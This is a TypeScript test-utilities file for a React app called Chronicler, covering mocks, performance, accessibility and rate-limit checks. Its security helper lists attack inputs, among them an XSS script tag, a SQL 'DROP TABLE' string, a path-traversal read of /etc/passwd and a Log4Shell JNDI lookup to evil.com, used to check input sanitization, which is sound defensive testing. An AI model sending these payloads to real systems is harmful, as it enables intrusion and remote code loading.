import { ReactWrapper } from 'enzyme';
import { fireEvent, screen, waitFor } from '@testing-library/react';
import { distanceCalculationFixtures, PerformanceDataGenerator } from '../data/testFixtures';

// Test utility functions for Chronicler application
export class TestHelpers {
  
  // File upload testing utilities
  static createMockFile(content: string, filename: string = 'test.txt', mimetype: string = 'text/plain'): File {
    return new File([content], filename, { type: mimetype });
  }
  
  static async simulateFileUpload(fileInput: HTMLInputElement, file: File): Promise<void> {
    const fileList = new DataTransfer();
    fileList.items.add(file);
    
    Object.defineProperty(fileInput, 'files', {
      value: fileList.files,
      writable: false
    });
    
    fireEvent.change(fileInput);
    
    // Wait for file processing
    await waitFor(() => {
      // Add specific wait conditions based on your file upload component
    }, { timeout: 5000 });
  }
  
  static async simulateDragAndDrop(dropZone: HTMLElement, files: File[]): Promise<void> {
    const dataTransfer = new DataTransfer();
    files.forEach(file => dataTransfer.items.add(file));
    
    fireEvent.dragEnter(dropZone, {
      dataTransfer
    });
    
    fireEvent.dragOver(dropZone, {
      dataTransfer
    });
    
    fireEvent.drop(dropZone, {
      dataTransfer
    });
    
    await waitFor(() => {
      // Wait for drag and drop processing
    });
  }
  
  // API testing utilities
  static createMockApiResponse(data: any, success: boolean = true): any {
    return {
      success,
      data: success ? data : undefined,
      error: success ? undefined : data,
      timestamp: new Date().toISOString()
    };
  }
  
  static mockFetch(response: any, status: number = 200): void {
    global.fetch = jest.fn().mockResolvedValue(new Response(
      JSON.stringify(response),
      {
        status,
        headers: { 'Content-Type': 'application/json' }
      }
    ));
  }
  
  static mockFetchError(error: Error): void {
    global.fetch = jest.fn().mockRejectedValue(error);
  }
  
  // Performance testing utilities
  static async measureExecutionTime<T>(fn: () => Promise<T> | T): Promise<{ result: T; timeMs: number }> {
    const startTime = performance.now();
    const result = await fn();
    const endTime = performance.now();
    
    return {
      result,
      timeMs: endTime - startTime
    };
  }
  
  static async runPerformanceTest(
    testFn: () => Promise<any>,
    iterations: number = 100,
    maxTimeMs: number = 1000
  ): Promise<{ averageTimeMs: number; maxTimeMs: number; minTimeMs: number; passed: boolean }> {
    const times: number[] = [];
    
    for (let i = 0; i < iterations; i++) {
      const { timeMs } = await this.measureExecutionTime(testFn);
      times.push(timeMs);
    }
    
    const averageTimeMs = times.reduce((sum, time) => sum + time, 0) / times.length;
    const maxTime = Math.max(...times);
    const minTime = Math.min(...times);
    
    return {
      averageTimeMs,
      maxTimeMs: maxTime,
      minTimeMs: minTime,
      passed: averageTimeMs <= maxTimeMs
    };
  }
  
  // Memory testing utilities
  static measureMemoryUsage(): { heapUsed: number; heapTotal: number; external: number } {
    if (typeof process !== 'undefined' && process.memoryUsage) {
      const usage = process.memoryUsage();
      return {
        heapUsed: usage.heapUsed / 1024 / 1024, // MB
        heapTotal: usage.heapTotal / 1024 / 1024, // MB
        external: usage.external / 1024 / 1024 // MB
      };
    }
    
    // Browser environment fallback
    if ('performance' in window && 'memory' in (window.performance as any)) {
      const memory = (window.performance as any).memory;
      return {
        heapUsed: memory.usedJSHeapSize / 1024 / 1024, // MB
        heapTotal: memory.totalJSHeapSize / 1024 / 1024, // MB
        external: 0
      };
    }
    
    return { heapUsed: 0, heapTotal: 0, external: 0 };
  }
  
  // Data validation utilities
  static validateDistanceCalculationResult(result: any): boolean {
    return (
      result &&
      typeof result.totalDistance === 'number' &&
      result.totalDistance >= 0 &&
      Array.isArray(result.pairs) &&
      result.pairs.every((pair: any) => 
        typeof pair.left === 'number' &&
        typeof pair.right === 'number' &&
        typeof pair. distance === 'number' &&
        pair.distance >= 0
      ) &&
      result.metadata &&
      typeof result.metadata.processingTimeMs === 'number'
    );
  }
  
  static validateApiResponseStructure(response: any): boolean {
    return (
      response &&
      typeof response.success === 'boolean' &&
      typeof response.timestamp === 'string' &&
      (response.success ? response.data : response.error)
    );
  }
  
  // UI testing utilities
  static async waitForLoadingToComplete(timeout: number = 5000): Promise<void> {
    await waitFor(() => {
      const loadingElement = screen.queryByTestId('loading-spinner');
      expect(loadingElement).not.toBeInTheDocument();
    }, { timeout });
  }
  
  static async waitForErrorMessage(expectedMessage: string, timeout: number = 3000): Promise<void> {
    await waitFor(() => {
      const errorElement = screen.getByText(expectedMessage);
      expect(errorElement).toBeInTheDocument();
    }, { timeout });
  }
  
  static async typeInInput(input: HTMLElement, text: string, delay: number = 50): Promise<void> {
    for (const char of text) {
      fireEvent.change(input, { target: { value: (input as HTMLInputElement).value + char } });
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
  
  // Accessibility testing utilities
  static async runAccessibilityChecks(container: HTMLElement): Promise<{ violations: any[]; passed: boolean }> {
    // Mock implementation - in real tests would use @axe-core/react
    const violations: any[] = [];
    
    // Check for basic accessibility issues
    const elementsWithoutLabels = container.querySelectorAll('input:not([aria-label]):not([aria-labelledby])');
    if (elementsWithoutLabels.length > 0) {
      violations.push({
        id: 'missing-aria-labels',
        description: 'Input elements should have accessible labels',
        nodes: elementsWithoutLabels
      });
    }
    
    const buttonsWithoutLabels = container.querySelectorAll('button:empty:not([aria-label]):not([aria-labelledby])');
    if (buttonsWithoutLabels.length > 0) {
      violations.push({
        id: 'empty-buttons',
        description: 'Buttons should have accessible text or labels',
        nodes: buttonsWithoutLabels
      });
    }
    
    return {
      violations,
      passed: violations.length === 0
    };
  }
  
  // Security testing utilities
  static generateMaliciousInputs(): string[] {
    return [
      '<script>alert("xss")</script>',
      'DROP TABLE users;',
      '../../../etc/passwd',
      '${jndi:ldap://evil.com/a}',
      '\x00\x01\x02\x03',
      'eval(Math.random())',
      'javascript:alert(1)',
      '"><img src=x onerror=alert(1)>'
    ];
  }
  
  static validateInputSanitization(input: string, output: string): boolean {
    // Check that malicious content has been removed or escaped
    const dangerousPatterns = [
      /<script[^>]*>/i,
      /javascript:/i,
      /on\w+\s*=/i,
      /\x00/,
      /[\x01-\x08\x0B\x0C\x0E-\x1F\x7F]/
    ];
    
    return !dangerousPatterns.some(pattern => pattern.test(output));
  }
  
  // Test data generators
  static generateRandomDistanceData(size: number): { list1: number[]; list2: number[] } {
    return PerformanceDataGenerator.generateLargeDataset(size);
  }
  
  static generateEdgeCaseData(): Array<{ list1: number[]; list2: number[]; expectedError?: string }> {
    return [
      { list1: [], list2: [], expectedError: 'Arrays cannot be empty' },
      { list1: [1], list2: [1, 2], expectedError: 'Lists must have equal length' },
      { list1: [NaN], list2: [1], expectedError: 'must be a finite number' },
      { list1: [Infinity], list2: [1], expectedError: 'must be a finite number' },
      { list1: [1e308], list2: [1], expectedError: 'number too large' }
    ];
  }
  
  // Internationalization testing utilities
  static mockLanguageContext(language: 'english' | 'sindarin' = 'english'): any {
    return {
      language,
      toggleLanguage: jest.fn(),
      t: jest.fn((key: string) => {
        const translations = {
          english: {
            'upload.title': 'Submit Chronicle Lists',
            'results.totalDistance': 'Total Distance'
          },
          sindarin: {
            'upload.title': 'Orthad i Glîn',
            'results.totalDistance': 'Aphadon Iaur'
          }
        };
        return translations[language][key] || key;
      })
    };
  }
  
  // Rate limiting testing utilities
  static async testRateLimit(
    apiCall: () => Promise<any>,
    limit: number,
    windowMs: number
  ): Promise<{ requestsBlocked: number; passed: boolean }> {
    const requests = [];
    let requestsBlocked = 0;
    
    // Fire requests rapidly
    for (let i = 0; i < limit + 50; i++) {
      try {
        requests.push(apiCall());
      } catch (error) {
        if (error.message.includes('rate limit')) {
          requestsBlocked++;
        }
      }
    }
    
    const results = await Promise.allSettled(requests);
    const failed = results.filter(r => r.status === 'rejected').length;
    
    return {
      requestsBlocked: requestsBlocked + failed,
      passed: requestsBlocked > 0 // Should block some requests
    };
  }
  
  // Cleanup utilities
  static cleanup(): void {
    // Reset mocks
    jest.clearAllMocks();
    
    // Reset fetch mock
    if (global.fetch && jest.isMockFunction(global.fetch)) {
      (global.fetch as jest.Mock).mockReset();
    }
    
    // Clear timers
    jest.clearAllTimers();
    
    // Reset DOM
    document.body.innerHTML = '';
  }
  
  // Test environment detection
  static isNodeEnvironment(): boolean {
    return typeof process !== 'undefined' && process.versions && process.versions.node;
  }
  
  static isBrowserEnvironment(): boolean {
    return typeof window !== 'undefined' && typeof document !== 'undefined';
  }
  
  // Debugging utilities
  static debugComponent(component: any, label: string = 'Component'): void {
    if (process.env.NODE_ENV === 'test' && process.env.DEBUG_TESTS) {
      console.log(`\n=== ${label} Debug ===`);
      if (component.debug) {
        component.debug();
      } else {
        console.log(component);
      }
      console.log('=================\n');
    }
  }
  
  static logTestMetrics(testName: string, metrics: Record<string, any>): void {
    if (process.env.NODE_ENV === 'test' && process.env.LOG_METRICS) {
      console.log(`\n📊 Test Metrics: ${testName}`);
      Object.entries(metrics).forEach(([key, value]) => {
        console.log(`   ${key}: ${value}`);
      });
      console.log('');
    }
  }
}

// Export commonly used test utilities as standalone functions
export const {
  measureExecutionTime,
  runPerformanceTest,
  validateDistanceCalculationResult,
  waitForLoadingToComplete,
  runAccessibilityChecks,
  generateMaliciousInputs,
  cleanup
} = TestHelpers;